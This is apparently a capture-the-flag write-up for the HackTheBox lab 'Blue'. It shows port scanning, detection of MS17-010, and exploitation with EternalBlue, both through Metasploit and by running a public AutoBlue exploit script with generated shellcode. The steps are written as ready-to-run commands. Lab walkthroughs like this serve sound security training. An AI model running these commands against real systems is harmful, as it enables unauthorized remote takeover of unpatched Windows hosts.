## Blue

Difficulty: Easy

### User Flag and Root Flag

Rustscan returns port 139 and 445 as open.  

Scanning with nmap we discover that the host is vulnerable to ms17-010.

```
rustscan -a 10.10.10.40 --ulimit 5000 -- -A -sV -sC -oN nmap.txt

nmap -p 139,445 -A --script vuln 10.10.10.40
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/e1258724-2f82-4fb6-b7dc-c98b251b5dc5)

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/891390be-a6f2-4f5d-8297-851a7249cb75)

<br>

#### Automatic Exploitation

We can exploit this automatically with metasploit.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

![metasploit](https://github.com/b1d0ws/OSCP/assets/58514930/883beede-9bc3-4a27-b44d-a4ebae60ea6c)

<br>

#### Manual Exploitation

Or manually with [this exploit](https://github.com/3ndG4me/AutoBlue-MS17-010).

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git

shell_prep.sh

python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

![shellcodeGenerating](https://github.com/b1d0ws/OSCP/assets/58514930/481067e2-12fb-4e72-8192-4d9636ab952b)

![manualExploit](https://github.com/b1d0ws/OSCP/assets/58514930/5feb1f9e-0108-42e5-b1dd-47941bec3554)

